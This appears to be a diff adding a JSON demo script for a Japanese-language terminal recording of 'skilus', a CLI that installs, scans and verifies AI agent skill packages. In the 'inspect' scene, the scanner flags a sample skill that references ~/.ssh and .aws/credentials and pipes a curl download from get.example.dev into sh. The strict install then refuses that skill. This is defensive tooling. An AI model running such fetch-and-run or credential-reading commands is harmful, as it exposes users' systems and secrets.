@@ -1,0 +1,354 @@
+{
+ "lang": "ja",
+ "cols": 76,
+ "scenes": [
+  {
+   "name": "add",
+   "steps": [
+    [
+     "cmd",
+     "skilus add anthropics/skills"
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 個のスキル",
+      "",
+      "<span class=\"b\">どのスキルをインストールしますか?</span>",
+      "<span class=\"d\">↑↓ 移動 · スペース 選択 · → すべて · ← なし · 入力で絞り込み · Enter 決定</span>",
+      "<span class=\"c\">›</span> <span class=\"g\">[x]</span> <span class=\"b\">academy-guide        </span>  <span class=\"d\">Stop and check this skill before finishing an…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">algorithmic-art      </span>  <span class=\"d\">Creating algorithmic art using p5.js with see…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">brand-guidelines     </span>  <span class=\"d\">Applies Anthropic&#x27;s official brand colors and…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">canvas-design        </span>  <span class=\"d\">Create beautiful visual art in .png and .pdf …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">claude-api           </span>  <span class=\"d\">Reference for the Claude API / Anthropic SDK …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">discernment-nudge    </span>  <span class=\"d\">After you give a substantive answer or draft …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">doc-coauthoring      </span>  <span class=\"d\">Guide users through a structured workflow for…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">docx                 </span>  <span class=\"d\">Use this skill whenever the user wants to cre…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">frontend-design      </span>  <span class=\"d\">Guidance for distinctive, intentional visual …</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">internal-comms       </span>  <span class=\"d\">A set of resources to help me write all kinds…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">mcp-builder          </span>  <span class=\"d\">Guide for creating high-quality MCP (Model Co…</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">pdf                  </span>  <span class=\"d\">Use this skill whenever the user wants to do …</span>",
+      "<span class=\"d\">  ↓ あと 7 件</span>",
+      "<span class=\"d\">  19 / 19 件を選択</span>"
+     ],
+     1800
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 個のスキル",
+      "",
+      "<span class=\"b\">どのスキルをインストールしますか?</span>",
+      "<span class=\"d\">↑↓ 移動 · スペース 選択 · → すべて · ← なし · 入力で絞り込み · Enter 決定</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">academy-guide        </span>  <span class=\"d\">Stop and check this skill before finishing an…</span>",
+      "  [ ] <span class=\"b\">algorithmic-art      </span>  <span class=\"d\">Creating algorithmic art using p5.js with see…</span>",
+      "  [ ] <span class=\"b\">brand-guidelines     </span>  <span class=\"d\">Applies Anthropic&#x27;s official brand colors and…</span>",
+      "  [ ] <span class=\"b\">canvas-design        </span>  <span class=\"d\">Create beautiful visual art in .png and .pdf …</span>",
+      "  [ ] <span class=\"b\">claude-api           </span>  <span class=\"d\">Reference for the Claude API / Anthropic SDK …</span>",
+      "  [ ] <span class=\"b\">discernment-nudge    </span>  <span class=\"d\">After you give a substantive answer or draft …</span>",
+      "  [ ] <span class=\"b\">doc-coauthoring      </span>  <span class=\"d\">Guide users through a structured workflow for…</span>",
+      "  [ ] <span class=\"b\">docx                 </span>  <span class=\"d\">Use this skill whenever the user wants to cre…</span>",
+      "  [ ] <span class=\"b\">frontend-design      </span>  <span class=\"d\">Guidance for distinctive, intentional visual …</span>",
+      "  [ ] <span class=\"b\">internal-comms       </span>  <span class=\"d\">A set of resources to help me write all kinds…</span>",
+      "  [ ] <span class=\"b\">mcp-builder          </span>  <span class=\"d\">Guide for creating high-quality MCP (Model Co…</span>",
+      "  [ ] <span class=\"b\">pdf                  </span>  <span class=\"d\">Use this skill whenever the user wants to do …</span>",
+      "<span class=\"d\">  ↓ あと 7 件</span>",
+      "<span class=\"d\">  0 / 19 件を選択</span>"
+     ],
+     900
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 個のスキル",
+      "",
+      "<span class=\"b\">どのスキルをインストールしますか?</span>",
+      "<span class=\"d\">↑↓ 移動 · スペース 選択 · → すべて · ← なし · 入力で絞り込み · Enter 決定</span>",
+      "<span class=\"d\">フィルター:</span> <span class=\"b\">p</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">claude-api    </span>  <span class=\"d\">Reference for the Claude API / Anthropic SDK — model…</span>",
+      "  [ ] <span class=\"b\">mcp-builder   </span>  <span class=\"d\">Guide for creating high-quality MCP (Model Context P…</span>",
+      "  [ ] <span class=\"b\">pdf           </span>  <span class=\"d\">Use this skill whenever the user wants to do anythin…</span>",
+      "  [ ] <span class=\"b\">pptx          </span>  <span class=\"d\">Use this skill any time a .pptx or .potx file is inv…</span>",
+      "  [ ] <span class=\"b\">webapp-testing</span>  <span class=\"d\">Toolkit for interacting with and testing local web a…</span>",
+      "<span class=\"d\">  5 / 19 件が一致 · 0 件を選択</span>"
+     ],
+     450
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 個のスキル",
+      "",
+      "<span class=\"b\">どのスキルをインストールしますか?</span>",
+      "<span class=\"d\">↑↓ 移動 · スペース 選択 · → すべて · ← なし · 入力で絞り込み · Enter 決定</span>",
+      "<span class=\"d\">フィルター:</span> <span class=\"b\">pd</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">pdf</span>  <span class=\"d\">Use this skill whenever the user wants to do anything with PDF …</span>",
+      "<span class=\"d\">  1 / 19 件が一致 · 0 件を選択</span>"
+     ],
+     450
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 個のスキル",
+      "",
+      "<span class=\"b\">どのスキルをインストールしますか?</span>",
+      "<span class=\"d\">↑↓ 移動 · スペース 選択 · → すべて · ← なし · 入力で絞り込み · Enter 決定</span>",
+      "<span class=\"d\">フィルター:</span> <span class=\"b\">pdf</span>",
+      "<span class=\"c\">›</span> [ ] <span class=\"b\">pdf</span>  <span class=\"d\">Use this skill whenever the user wants to do anything with PDF …</span>",
+      "<span class=\"d\">  1 / 19 件が一致 · 0 件を選択</span>"
+     ],
+     700
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 個のスキル",
+      "",
+      "<span class=\"b\">どのスキルをインストールしますか?</span>",
+      "<span class=\"d\">↑↓ 移動 · スペース 選択 · → すべて · ← なし · 入力で絞り込み · Enter 決定</span>",
+      "<span class=\"d\">フィルター:</span> <span class=\"b\">pdf</span>",
+      "<span class=\"c\">›</span> <span class=\"g\">[x]</span> <span class=\"b\">pdf</span>  <span class=\"d\">Use this skill whenever the user wants to do anything with PDF …</span>",
+      "<span class=\"d\">  1 / 19 件が一致 · 1 件を選択</span>"
+     ],
+     900
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 個のスキル",
+      "",
+      "<span class=\"b\">どのスキルをインストールしますか?</span> pdf",
+      "<span class=\"b\">どのエージェントに入れますか?</span>",
+      "<span class=\"d\">↑↓ 移動 · スペース 選択 · → すべて · ← なし · 入力で絞り込み · Enter 決定</span>",
+      "<span class=\"c\">›</span> <span class=\"g\">[x]</span> <span class=\"b\">Claude Code</span>  <span class=\"d\">.claude/skills</span>",
+      "  <span class=\"g\">[x]</span> <span class=\"b\">Codex      </span>  <span class=\"d\">.agents/skills</span>",
+      "  2 / 74 個のエージェントがインストール済み · その他は --agent &lt;id&gt; で（一…"
+     ],
+     1600
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 個のスキル",
+      "",
+      "<span class=\"b\">どのスキルをインストールしますか?</span> pdf",
+      "<span class=\"b\">どのエージェントに入れますか?</span> Claude Code, Codex",
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 1 個のスキル",
+      "",
+      "● <span class=\"b\">pdf</span>   <span class=\"d\">12 ファイル · 57 KiB · sha256 32cdced3a21a</span>",
+      "  Use this skill whenever the user wants to do anything with PDF files. This",
+      "  includes reading or extracting text/tables from PDFs, combining or mergin…",
+      "  <span class=\"y\">!</span> scripts/extract_form_structure.py: 実行ファイルです。allow: [scripts]",
+      "    で許可してください <span class=\"d\">[executable]</span>",
+      "",
+      "配置先: .claude/skills (claude-code, copy) · .agents/skills (codex, copy)",
+      "1 個のスキル · ブロック 0 件 · <span class=\"y\">警告 1 件</span>",
+      "インストールしますか? [y/N]"
+     ],
+     1800
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 19 個のスキル",
+      "",
+      "<span class=\"b\">どのスキルをインストールしますか?</span> pdf",
+      "<span class=\"b\">どのエージェントに入れますか?</span> Claude Code, Codex",
+      "<span class=\"b\">github.com/anthropics/skills</span> · commit dbd4588f9e10 · 1 個のスキル",
+      "",
+      "● <span class=\"b\">pdf</span>   <span class=\"d\">12 ファイル · 57 KiB · sha256 32cdced3a21a</span>",
+      "  Use this skill whenever the user wants to do anything with PDF files. This",
+      "  includes reading or extracting text/tables from PDFs, combining or mergin…",
+      "  <span class=\"y\">!</span> scripts/extract_form_structure.py: 実行ファイルです。allow: [scripts]",
+      "    で許可してください <span class=\"d\">[executable]</span>",
+      "",
+      "配置先: .claude/skills (claude-code, copy) · .agents/skills (codex, copy)",
+      "1 個のスキル · ブロック 0 件 · <span class=\"y\">警告 1 件</span>",
+      "インストールしますか? [y/N] y",
+      "",
+      "pdf (32cdced3a21a) を 2 個の配置先にインストールしました。"
+     ],
+     2600
+    ]
+   ]
+  },
+  {
+   "name": "inspect",
+   "steps": [
+    [
+     "cmd",
+     "skilus inspect ./downloads/quick-cleanup"
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">downloads/quick-cleanup</span> · 1 個のスキル",
+      "",
+      "● <span class=\"b\">quick-cleanup</span>   <span class=\"d\">2 ファイル · 298 B · sha256 27a5b9bedd30</span>",
+      "  Clears build caches and temporary files in the current project.",
+      "  <span class=\"y\">!</span> SKILL.md: 認証情報に言及しています: ~/.ssh <span class=\"d\">[credential-access]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: 実行ファイルです。allow: [scripts] で許可してください",
+      "    <span class=\"d\">[executable]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: コードをダウンロードして実行します: curl -fsSL",
+      "    https://get.example.dev/setup.sh | sh <span class=\"d\">[pipe-to-shell]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: 認証情報に言及しています: .aws/credentials",
+      "    <span class=\"d\">[credential-access]</span>",
+      "",
+      "1 個のスキル · ブロック 0 件 · <span class=\"y\">警告 4 件</span>"
+     ],
+     2600
+    ],
+    [
+     "clear"
+    ],
+    [
+     "cmd",
+     "skilus add ./downloads/quick-cleanup --strict -y"
+    ],
+    [
+     "frame",
+     [
+      "<span class=\"b\">./downloads/quick-cleanup</span> · 1 個のスキル",
+      "",
+      "● <span class=\"b\">quick-cleanup</span>   <span class=\"d\">2 ファイル · 298 B · sha256 27a5b9bedd30</span>",
+      "  Clears build caches and temporary files in the current project.",
+      "  <span class=\"y\">!</span> SKILL.md: 認証情報に言及しています: ~/.ssh <span class=\"d\">[credential-access]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: 実行ファイルです。allow: [scripts] で許可してください",
+      "    <span class=\"d\">[executable]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: コードをダウンロードして実行します: curl -fsSL",
+      "    https://get.example.dev/setup.sh | sh <span class=\"d\">[pipe-to-shell]</span>",
+      "  <span class=\"y\">!</span> scripts/setup.sh: 認証情報に言及しています: .aws/credentials",
+      "    <span class=\"d\">[credential-access]</span>",
+      "",
+      "配置先: .claude/skills (claude-code, copy) · .agents/skills (codex, copy)",
+      "1 個のスキル · ブロック 0 件 · <span class=\"y\">警告 4 件</span>",
+      "skilus: quick-cleanup: --strict で警告 4 件: 検査で拒否されました"
+     ],
+     600
+    ],
+    [
+     "cmd",
+     "echo $?"
+    ],
+    [
+     "frame",
+     [
+      "5"
+     ],
+     3000
+    ]
+   ]
+  },
+  {
+   "name": "verify",
+   "steps": [
+    [
+     "cmd",
+     "echo \"# tweak\" >> .claude/skills/pdf/SKILL.md"
+    ],
+    [
+     "frame",
+     [],
+     600
+    ],
+    [
+     "cmd",
+     "skilus verify"
+    ],
+    [
+     "frame",
+     [
+      "変更あり pdf (project、claude-code)、場所: ~/acme-app/.claude/skills/pdf",
+      "  変更: SKILL.md",
+      "skilus sync を実行して復元してください（手動で変更した場合は --force を付けます）。"
+     ],
+     600
+    ],
+    [
+     "cmd",
+     "echo $?"
+    ],
+    [
+     "frame",
+     [
+      "6"
+     ],
+     1200
+    ],
+    [
+     "cmd",
+     "skilus sync --force"
+    ],
+    [
+     "frame",
+     [
+      "pdf を ~/acme-app/.claude/skills/pdf で置き換えました",
+      "同期しました: インストール 0 件、置き換え 1 件、変更なし 5 件。"
+     ],
+     900
+    ],
+    [
+     "cmd",
+     "skilus verify"
+    ],
+    [
+     "frame",
+     [
+      "問題ありません: 3 個のスキルが 6 個の配置先でロックと一致しています。"
+     ],
+     3000
+    ]
+   ]
+  },
+  {
+   "name": "update",
+   "steps": [
+    [
+     "cmd",
+     "skilus update --check"
+    ],
+    [
+     "frame",
+     [
+      "スキル        スコープ     REF          インストール済み      最新            状態",
+      "changelog  project  (デフォルトブランチ)  9563a12b25b5  1b288cd0c1c1  新しいバージョンあり",
+      "pdf        project  (デフォルトブランチ)  dbd4588f9e10  dbd4588f9e10  最新",
+      "review     project  (デフォルトブランチ)  9563a12b25b5  1b288cd0c1c1  新しいバージョンあり"
+     ],
+     1800
+    ],
+    [
+     "cmd",
+     "skilus update review"
+    ],
+    [
+     "frame",
+     [
+      "● <span class=\"b\">review</span>   <span class=\"d\">9563a12b25b5 → 1b288cd0c1c1 · sha256 3a46a113926d → 1c92660a3b6f</span>",
+      "  <span class=\"y\">~</span> SKILL.md",
+      "  <span class=\"g\">✓</span> 指摘事項なし",
+      "",
+      "1 個のスキル · ブロック 0 件 · 警告 0 件",
+      "更新しますか? [y/N]"
+     ],
+     1800
+    ],
+    [
+     "frame",
+     [
+      "● <span class=\"b\">review</span>   <span class=\"d\">9563a12b25b5 → 1b288cd0c1c1 · sha256 3a46a113926d → 1c92660a3b6f</span>",
+      "  <span class=\"y\">~</span> SKILL.md",
+      "  <span class=\"g\">✓</span> 指摘事項なし",
+      "",
+      "1 個のスキル · ブロック 0 件 · 警告 0 件",
+      "更新しますか? [y/N] y",
+      "",
+      "review を 1b288cd0c1c1 に更新しました (1c92660a3b6f)。"
+     ],
+     3200
+    ]
+   ]
+  }
+ ]
+}
